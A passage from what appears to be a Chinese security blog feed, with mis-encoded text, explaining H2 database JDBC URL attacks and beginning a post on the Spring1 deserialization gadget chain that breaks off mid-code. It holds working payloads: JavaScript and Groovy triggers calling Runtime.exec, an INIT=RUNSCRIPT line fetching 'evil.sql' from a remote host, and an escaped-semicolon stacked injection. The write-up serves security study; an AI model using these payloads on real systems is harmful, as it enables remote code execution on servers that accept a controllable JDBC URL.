class="hljs-string">Java.type(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;calc&quot;);&#x27;</span>;<br> <br><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> hack <span class="hljs-keyword">VALUES</span> (<span class="hljs-number">1</span>);<br></code></pre></td></tr></table></figure><p>ä½†å®é™…ä¸Šåˆ›å»ºè§¦å‘å™¨æ—¶é‚£æ®µjsä»£ç å°±è¢«æ‰§è¡Œäº†ï¼Œåé¢æ’å…¥æ•°æ®ä¹Ÿæ²¡æœ‰æ‰§è¡Œ</p><p>å¥½åœ¨è¿™å¥åˆ›å»ºè§¦å‘å™¨çš„è¯­å¥å¯ä»¥å¤šæ¬¡æ‰§è¡Œ(å› ä¸ºæ ¹æœ¬æ²¡åˆ›å»ºæˆåŠŸ)</p><p>ä¸ºä»€ä¹ˆå‘¢ï¼Ÿå› ä¸ºè¿™æ®µjsä»£ç æœ¬æ„æ˜¯ç”¨æ¥è¿”å›ä¸€ä¸ª<code>Trigger</code>å¯¹è±¡çš„</p><p>æŸ¥çœ‹å®˜æ–¹æ–‡æ¡£<a href="https://www.h2database.com/html/commands.html#create_trigger">https://www.h2database.com/html/commands.html#create_trigger</a></p><blockquote><p>The trigger class must be public and implement <code>org.h2.api.Trigger</code>. Inner classes are not supported. The class must be available in the classpath of the database engine (when using the server mode, it must be in the classpath of the server).</p><p>The sourceCodeString must define a single method with no parameters that returns <code>org.h2.api.Trigger</code>. See <code>CREATE ALIAS</code> for requirements regarding the compilation. Alternatively, javax.script.ScriptEngineManager can be used to create an instance of <code>org.h2.api.Trigger</code>. Currently javascript (included in every <code>JRE</code>) and ruby (with <code>JRuby</code>) are supported. In that case the source must begin respectively with <code>//javascript</code> or <code>#ruby</code>.</p><p>Example:</p><p>CREATE TRIGGER TRIG_INS BEFORE INSERT ON TEST FOR EACH ROW CALL â€˜MyTriggerâ€™;</p><p>CREATE TRIGGER TRIG_SRC BEFORE INSERT ON TEST AS â€˜org.h2.api.Trigger create() { return new MyTrigger(â€œconstructorParamâ€); }â€™;</p><p>CREATE TRIGGER TRIG_JS BEFORE INSERT ON TEST AS â€˜&#x2F;&#x2F;javascript return new Packages.MyTrigger(â€œconstructorParamâ€);â€™;</p><p>CREATE TRIGGER TRIG_RUBY BEFORE INSERT ON TEST AS â€˜#ruby Java::MyPackage::MyTrigger.new(â€œconstructorParamâ€)â€™;</p></blockquote><p>å¯ä»¥ç”¨<code>javax.script.ScriptEngineManager</code>æ¥åˆ›å»ºä¸€ä¸ª<code>org.h2.api.Trigger</code>å®ä¾‹</p><p><code>org.h2.schema.TriggerObject#loadFromSource</code></p><p><img src="/2024/08/13/JDBC/image-20240813181204143.png" alt="image-20240813181204143"></p><p>åˆ¤æ–­æ˜¯å¦ä¸ºjsæˆ–rubyè„šæœ¬</p><p><img src="/2024/08/13/JDBC/image-20240813181216278.png" alt="image-20240813181216278"></p><p>ç®€å•åˆ¤æ–­æ˜¯å¦ä»¥<code>//javascript</code>å¼€å¤´</p><p><img src="/2024/08/13/JDBC/image-20240813181226959.png" alt="image-20240813181226959"></p><p>ç„¶åå°±æ˜¯ç»å…¸çš„<code>new ScriptEngineManager().getEngineByName(&quot;javascript&quot;)</code></p><p><img src="/2024/08/13/JDBC/image-20240813181240153.png" alt="image-20240813181240153"></p><p>è¿”å›<code>CompiledScript</code>è°ƒç”¨å…¶<code>eval</code></p><p>ä½ç‰ˆæœ¬H2(1.4.200ä¹‹å‰)è²Œä¼¼ä¸æ”¯æŒjsè„šæœ¬ï¼Œæ²¡æœ‰<code>isJavascriptSource</code>è¿™æ®µä»£ç ã€‚</p><h4 id="å‡ºç½‘åˆ©ç”¨â€”â€”init-runscript"><a href="#å‡ºç½‘åˆ©ç”¨â€”â€”init-runscript" class="headerlink" title="å‡ºç½‘åˆ©ç”¨â€”â€”init+runscript"></a>å‡ºç½‘åˆ©ç”¨â€”â€”init+runscript</h4><p>ä¸Šé¢è¿™äº›æ“ä½œçš„åˆ©ç”¨å‰æéƒ½æ˜¯h2 consoleæˆåŠŸè¿æ¥åˆ°æ•°æ®åº“ã€‚</p><p>ä½ç‰ˆæœ¬H2(<code>1.4.193</code>å·¦å³)å½“è¿æ¥çš„æ•°æ®åº“ä¸å­˜åœ¨æ—¶ä¼šè‡ªåŠ¨åˆ›å»ºï¼Œä½†é«˜ç‰ˆæœ¬å°±ä¸è¡Œäº†</p><p>ä¼šæŠ¥é”™<code>Database &quot;mem:test&quot; not found.either pre-create it or allow remote database creation</code></p><p>è¦ä¹ˆè¿æ¥Springbootä¸­<code>spring.datasource.url</code>æŒ‡æ˜çš„æ•°æ®åº“ï¼Œè¦ä¹ˆéœ€è¦å¯åŠ¨consoleæ—¶å¸¦ä¸Š<code>-ifNotExists</code>å‚æ•°</p><p>å› æ­¤èƒ½å¦ä¸è¿æ¥è¿›å»å°±èƒ½æ‰§è¡Œå‘½ä»¤å‘¢?</p><p>h2æ•°æ®åº“çš„JDBC URLä¸­æ”¯æŒçš„ä¸€ä¸ªé…ç½®<code>INIT</code></p><p>è¿™ä¸ªå‚æ•°è¡¨ç¤ºåœ¨è¿æ¥h2æ•°æ®åº“æ—¶ï¼Œä¼šæ‰§è¡Œä¸€æ¡åˆå§‹åŒ–å‘½ä»¤ã€‚ä¸è¿‡åªæ”¯æŒæ‰§è¡Œä¸€æ¡å‘½ä»¤ï¼Œè€Œä¸”ä¸èƒ½åŒ…å«åˆ†å·<code>;</code></p><p>ä¸Šé¢<code>CREATE ALIAS</code>ç”¨äºå‘½ä»¤æ‰§è¡Œçš„SQLè¯­å¥éƒ½ä¸æ­¢ä¸€æ¡ã€‚å¯ä»¥åˆ©ç”¨<code>RUNSCRIPT</code>å‘½ä»¤ã€‚<code>RUNSCRIPT</code>ç”¨äºæ‰§è¡Œä¸€ä¸ªSQLæ–‡ä»¶</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">jdbc:h2:mem:test;INIT=RUNSCRIPT FROM <span class="hljs-string">&#x27;http://127.0.0.1:8888/evil.sql&#x27;</span><br></code></pre></td></tr></table></figure><p>è¿™ä¸ªæ–¹æ³•èƒ½ç”¨åœ¨ä»»ä½•èƒ½é…ç½®JDBC URLä¸”ä¾èµ–äº†H2çš„åœ°æ–¹</p><p><img src="/2024/08/13/JDBC/image-20240813181326106.png" alt="image-20240813181326106"></p><p>ç„¶åå°±å¯ä»¥URLè¿œç¨‹åŠ è½½æ¶æ„ç±»äº†ã€‚</p><h4 id="ä¸å‡ºç½‘åˆ©ç”¨â€”â€”init-groovy"><a href="#ä¸å‡ºç½‘åˆ©ç”¨â€”â€”init-groovy" class="headerlink" title="ä¸å‡ºç½‘åˆ©ç”¨â€”â€”init+groovy"></a>ä¸å‡ºç½‘åˆ©ç”¨â€”â€”init+groovy</h4><p>JDBCè¿æ¥æ—¶<code>INIT</code>åªå…è®¸æ‰§è¡Œä¸€æ¡SQLå‘½ä»¤ï¼Œè€Œæˆ‘ä»¬çš„å‘½ä»¤æ‰§è¡Œæœ‰ä¸¤å¥ï¼Œä¸€å¥åˆ›å»ºUDFï¼Œä¸€å¥æ‰§è¡ŒUDF</p><p>é™¤éæœ‰å·²çŸ¥è¡¨ï¼Œä½¿ç”¨<code>CREATE TRIGGER</code>å°±åªéœ€ä¸€å¥ã€‚å®é™…ä¸Šå¯ä»¥åˆ©ç”¨H2çš„ç³»ç»Ÿè¡¨ï¼ŒH2å’ŒMySQLä¸€æ ·ä¹Ÿæœ‰<code>INFORMATION_SCHEMA</code></p><blockquote><p>The system tables and views in the schema <code>INFORMATION_SCHEMA</code> contain the meta data of all tables, views, domains, and other objects in the database as well as the current settings.</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">jdbc:h2:mem:test;init=CREATE TRIGGER TRIG_JS AFTER INSERT ON INFORMATION_SCHEMA.TABLES AS <span class="hljs-string">&#x27;//javascript</span><br><span class="hljs-string">Java.type(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;calc&quot;)&#x27;</span><br></code></pre></td></tr></table></figure><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒH2æå–URLä¸­çš„é…ç½®æ—¶æ˜¯é€šè¿‡åˆ†å‰²åˆ†å·<code>;</code>æ¥æå–çš„ï¼Œå› æ­¤JSä»£ç ä¸­ä¸èƒ½æœ‰åˆ†å·ï¼Œå¦åˆ™ä¼šæŠ¥é”™ï¼ˆå¯ä»¥åŠ ä¸Šåæ–œæ ä»£è¡¨è½¬ä¹‰ï¼‰</p><p><img src="/2024/08/13/JDBC/image-20240813181406492.png" alt="image-20240813181406492"></p><p>è‹¥ç›®æ ‡ç¯å¢ƒæœ‰<code>Groovy</code>ä¾èµ–ï¼Œå¯ä»¥ä½¿ç”¨å…ƒç¼–ç¨‹çš„æŠ€å·§æ¥å‘½ä»¤æ‰§è¡Œï¼Œåœ¨ç¼–è¯‘<code>Groovy</code>è¯­å¥è€Œéæ‰§è¡Œæ—¶å°±æ‰§è¡Œæ”»å‡»è€…çš„ä»£ç ã€‚</p><p>æ·»åŠ <code>groovy-sql</code>ä¾èµ–</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.codehaus.groovy<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>groovy-sql<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.0.8<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">jdbc:h2:mem:test;init=CREATE ALIAS shell2 AS<br>$$<span class="hljs-meta">@groovy</span>.transform.ASTTest(value=&#123;<br><span class="hljs-keyword">assert</span> java.lang.Runtime.getRuntime().exec(<span class="hljs-string">&quot;cmd.exe /c calc.exe&quot;</span>)<br>&#125;)<br>def x$$<br></code></pre></td></tr></table></figure><h4 id="SQLI-2-RCE"><a href="#SQLI-2-RCE" class="headerlink" title="SQLI 2 RCE"></a>SQLI 2 RCE</h4><p>å¯è§<a href="https://www.cnblogs.com/EddieMurphy-blogs/p/18015760">HGAME week2-web wp - Eddie_Murphy - åšå®¢å›­ (cnblogs.com)</a>çš„SearchVmenberé‚£é“é¢˜ã€‚</p><p><code>INIT</code>å‚æ•°å¯ä»¥ç›´æ¥åœ¨è¿æ¥æ•°æ®åº“æ—¶æ‰§è¡Œåˆå§‹åŒ–çš„sqlè¯­å¥</p><p>é™¤äº†<code>INIT</code>å‚æ•°ï¼Œä¸€äº›å‚æ•°åœ¨è¿æ¥æ•°æ®åº“æ—¶ä¼šæ‰§è¡ŒSETå‘½ä»¤ï¼Œå­˜åœ¨SQLæ³¨å…¥</p><p>æ¯”å¦‚<code>TRACE_LEVEL_SYSTEM_OUT</code>ã€<code>TRACE_MAX_FILE_SIZE</code>â€¦â€¦</p><p><img src="/2024/08/13/JDBC/image-20240813181531078.png" alt="image-20240813181531078"></p><p><code>org.h2.engine.Engine#openSession</code>ä¼šå¯¹æˆ‘ä»¬ä¼ å…¥çš„å‚æ•°è¿›è¡Œ<code>SET</code>è¯­å¥æ‹¼æ¥</p><p><img src="/2024/08/13/JDBC/image-20240813181544236.png" alt="image-20240813181544236"></p><p>å¼€å§‹å°è¯•å †å æ³¨å…¥</p><h4 id="å‘ï¼šsemicolonåˆ†å‰²ä¹‹ç—›"><a href="#å‘ï¼šsemicolonåˆ†å‰²ä¹‹ç—›" class="headerlink" title="å‘ï¼šsemicolonåˆ†å‰²ä¹‹ç—›"></a>å‘ï¼šsemicolonåˆ†å‰²ä¹‹ç—›</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">jdbc:h2:mem:test;TRACE_LEVEL_SYSTEM_OUT=<span class="hljs-number">3</span>;CREATE TRIGGER TRIG_JS BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$<span class="hljs-comment">//javascript</span><br>Java.type(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>).getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>)$$--<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªpayloadå¹¶ä¸èƒ½æ‰“é€šï¼Œè¿˜å¾—çœ‹å®ƒæ˜¯æ€ä¹ˆæå–settingå‚æ•°çš„</p><p><code>org.h2.engine.ConnectionInfo#readSettingsFromURL</code> è¿™ä¸ªç±»ç”¨äºå­˜å‚¨è¿æ¥ä¿¡æ¯</p><p><img src="/2024/08/13/JDBC/image-20240813181602835.png" alt="image-20240813181602835"></p><p>é—®é¢˜å°±å‡ºåœ¨è¿™ï¼Œæˆ‘ä»¬ç”¨äºå †å æ³¨å…¥çš„åˆ†å·<code>;</code>ï¼ŒåŒæ—¶ä¹Ÿæ˜¯H2ç”¨æ¥æå–è®¾ç½®å‚æ•°çš„åˆ†éš”ç¬¦ã€‚ã€‚ã€‚ğŸ¥²</p><p>ä½†è¦æ˜¯settingsçš„å€¼æœ¬æ¥å°±å­˜åœ¨åˆ†å·æ€ä¹ˆåŠï¼Œç…§ç†æ˜¯ä¼šæä¾›è½¬ä¹‰çš„ï¼Œè·Ÿè¿›<code>StringUtils.arraySplit</code>ä¸€æ¢ç©¶ç«Ÿ</p><p><img src="/2024/08/13/JDBC/image-20240813181626818.png" alt="image-20240813181626818"></p><p>æœç„¶æ˜¯æ”¯æŒåæ–œæ è½¬ä¹‰çš„ã€‚å› æ­¤åœ¨payloadä¸­åˆ†å·å‰é¢åŠ ä¸Š<code>\</code>å³å¯</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">jdbc:h2:mem:test;TRACE_LEVEL_SYSTEM_OUT=<span class="hljs-number">1</span>\;CREATE TRIGGER TRIG_JS BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$<span class="hljs-comment">//javascript</span><br>Java.type(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>).getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>)$$--<br></code></pre></td></tr></table></figure><h3 id="åè®°"><a href="#åè®°" class="headerlink" title="åè®°"></a>åè®°</h3><p>åŸºæœ¬çº¯æŠ„çš„ï¼Œå› ä¸ºåˆ†æèµ·æ¥å¤ªè´¹åŠ²äº†ï¼Œå°¤å…¶æ˜¯é…ç¯å¢ƒä¹‹ç±»çš„â€¦ä»¥å‰çš„ç¯å¢ƒæ‰¾ä¸åˆ°äº†å°±åˆå·ä¸ªæ‡’ã€‚</p><p>è¿™é‡Œç®€å•ä»‹ç»äº†H2çš„JDBCæ”»å‡»æ–¹æ³•ï¼Œåœ¨JDBC URLå¯æ§çš„æƒ…å†µä¸‹ï¼ˆä¸å±€é™äºh2 web consoleï¼‰</p><ul><li>JNDIæ³¨å…¥ï¼ˆé«˜ç‰ˆæœ¬é™åˆ¶äº†åªèƒ½æ˜¯javaåè®®ï¼‰</li><li>åˆ©ç”¨initå‚æ•°æ‰§è¡Œ<code>RUNSCRIPT</code>å‘½ä»¤åŠ è½½æ‰§è¡Œè¿œç¨‹æ¶æ„SQL</li><li>åˆ©ç”¨initå‚æ•°ç›´æ¥æ‰§è¡Œ<code>groovy</code>å…ƒç¼–ç¨‹ä»£ç ï¼ˆä¸å‡ºç½‘ï¼‰</li><li>åˆ©ç”¨å…¶ä»–è¿æ¥å‚æ•°è¿›è¡Œå †å æ³¨å…¥</li></ul><p>å½“ç„¶è‹¥èƒ½ç›´æ¥è¿æ¥ä¸Šå»ï¼Œå°±èƒ½ç›´æ¥UDFå‘½ä»¤æ‰§è¡Œäº†ã€‚</p><p>è€Œå¯¹äºh2 web consoleï¼Œåˆ©ç”¨æ–¹å¼ä¼šå—åˆ°ä¸€äº›é™åˆ¶ï¼š</p><ul><li>éœ€è¦å¼€å¯<code>-webAllowOthers</code>é€‰é¡¹ï¼Œæ”¯æŒå¤–éƒ¨è¿æ¥</li><li>éœ€è¦å¼€å¯<code>-ifNotExists</code>é€‰é¡¹ï¼Œæ”¯æŒåˆ›å»ºæ•°æ®åº“</li></ul><p>å‚è€ƒï¼š</p><p><a href="https://p4d0rn.gitbook.io/java/jdbc-attack/h2#springboot-zheng-he">H2 JDBC Attack | Java (gitbook.io)</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Spring</title>
    <link href="/2024/08/12/Spring/"/>
    <url>/2024/08/12/Spring/</url>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æ²¡å•¥å¥½è¯´çš„ï¼Œçœ‹çœ‹å§ã€‚</p><h2 id="Spring1"><a href="#Spring1" class="headerlink" title="Spring1"></a>Spring1</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-beans<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.1.4.RELEASE<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-core<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.1.4.RELEASE<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="MethodInvokeTypeProvider"><a href="#MethodInvokeTypeProvider" class="headerlink" title="MethodInvokeTypeProvider"></a>MethodInvokeTypeProvider</h3><p>åˆ‡å…¥ç‚¹åœ¨ <code>org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MethodInvokeTypeProvider</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">TypeProvider</span> &#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> TypeProvider provider;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> String methodName;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> index;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">transient</span> Object result;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">MethodInvokeTypeProvider</span><span class="hljs-params">(TypeProvider provider, Method method, <span class="hljs-type">int</span> index)</span> &#123;<br>        <span class="hljs-built_in">this</span>.provider = provider;<br>        <span class="hljs-built_in">this</span>.methodName = method.getName();<br>        <span class="hljs-built_in">this</span>.index = index;<br>        <span class="hljs-built_in">this</span>.result = ReflectionUtils.invokeMethod(method, provider.getType());<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream inputStream)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        inputStream.defaultReadObject();<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> ReflectionUtils.findMethod(<span class="hljs-built_in">this</span>.provider.getType().getClass(), <span class="hljs-built_in">this</span>.methodName);<br>        <span class="hljs-built_in">this</span>.result = ReflectionUtils.invokeMethod(method, <span class="hljs-built_in">this</span>.provider.getType());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>readObject</code>ä¼šè°ƒç”¨<code>this.provider.getType()</code>è¿”å›å¯¹è±¡çš„<code>this.methodName</code>æŒ‡å®šçš„æ–¹æ³•ï¼Œè¿™é‡Œ<code>ReflectionUtils.findMethod</code>å’Œ<code>ReflectionUtils.invokeMethod</code>éƒ½æ²¡æœ‰ä¼ é€’<code>Method</code>çš„å‚æ•°ï¼Œå› æ­¤æ˜¯æ— å‚æ–¹æ³•å’Œæ— å‚è°ƒç”¨ã€‚</p><p>æˆ‘ä»¬çš„ç›®æ ‡æ˜¯è®©<code>this.MethodName</code>ä¸º<code>newTransformer</code>æˆ–<code>getOutputProperties</code>ï¼ˆè¿™ä¸¤ä¸ªéƒ½æ˜¯publicæ–¹æ³•ï¼Œ<code>findMethod</code>å’Œ<code>invokeMethod</code>éƒ½æ²¡æœ‰è®¾ç½®<code>Method</code>çš„å¯è®¿é—®æ€§ï¼‰ï¼Œè®©<code>this.provider.getType()</code>è¿”å›<code>TemplatesImpl</code>ã€‚</p><p>è¿™ä¸ªå¯ä»¥é€šè¿‡åŠ¨æ€ä»£ç†å®ç°ï¼Œå…ˆä»‹ç»å‡ ä¸ªè°ƒç”¨å¤„ç†å™¨ã€‚</p><h3 id="ObjectFactoryDelegatingInvocationHandler"><a href="#ObjectFactoryDelegatingInvocationHandler" class="headerlink" title="ObjectFactoryDelegatingInvocationHandler"></a>ObjectFactoryDelegatingInvocationHandler</h3><p><code>org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ObjectFactoryDelegatingInvocationHandler</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">InvocationHandler</span>, Serializable &#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> ObjectFactory&lt;?&gt; objectFactory;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">ObjectFactoryDelegatingInvocationHandler</span><span class="hljs-params">(ObjectFactory&lt;?&gt; objectFactory)</span> &#123;<br>        <span class="hljs-built_in">this</span>.objectFactory = objectFactory;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> <span class="hljs-keyword">throws</span> Throwable &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">methodName</span> <span class="hljs-operator">=</span> method.getName();<br>        <span class="hljs-keyword">if</span> (methodName.equals(<span class="hljs-string">&quot;equals&quot;</span>)) &#123;<br>            <span class="hljs-comment">// Only consider equal when proxies are identical.</span><br>            <span class="hljs-keyword">return</span> (proxy == args[<span class="hljs-number">0</span>]);<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (methodName.equals(<span class="hljs-string">&quot;hashCode&quot;</span>)) &#123;<br>            <span class="hljs-comment">// Use hashCode of proxy.</span><br>            <span class="hljs-keyword">return</span> System.identityHashCode(proxy);<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (methodName.equals(<span class="hljs-string">&quot;toString&quot;</span>)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.objectFactory.toString();<br>        &#125;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">return</span> method.invoke(<span class="hljs-built_in">this</span>.objectFactory.getObject(), args);<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (InvocationTargetException ex) &#123;<br>            <span class="hljs-keyword">throw</span> ex.getTargetException();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>invokeä¸­ä¼šæŠŠæ–¹æ³•è°ƒç”¨å§”æ´¾ç»™<code>objectFactory#getObject()</code>è·å–åˆ°çš„å¯¹è±¡ã€‚</p><h3 id="AnnotationInvocationHandler"><a href="#AnnotationInvocationHandler" class="headerlink" title="AnnotationInvocationHandler"></a>AnnotationInvocationHandler</h3><p><code>sun.reflect.annotation.AnnotationInvocationHandler</code></p><p>è€æœ‹å‹äº†ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">AnnotationInvocationHandler</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">InvocationHandler</span>, Serializable &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Annotation</span>&gt; type;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Map&lt;String, Object&gt; memberValues;<br><br>    AnnotationInvocationHandler(Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Annotation</span>&gt; type, Map&lt;String, Object&gt; memberValues) &#123;<br>        Class&lt;?&gt;[] superInterfaces = type.getInterfaces();<br>        <span class="hljs-keyword">if</span> (!type.isAnnotation() ||<br>            superInterfaces.length != <span class="hljs-number">1</span> ||<br>            superInterfaces[<span class="hljs-number">0</span>] != java.lang.annotation.Annotation.class)<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AnnotationFormatError</span>(<span class="hljs-string">&quot;Attempt to create proxy for a non-annotation type.&quot;</span>);<br>        <span class="hljs-built_in">this</span>.type = type;<br>        <span class="hljs-built_in">this</span>.memberValues = memberValues;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> &#123;<br>        <span 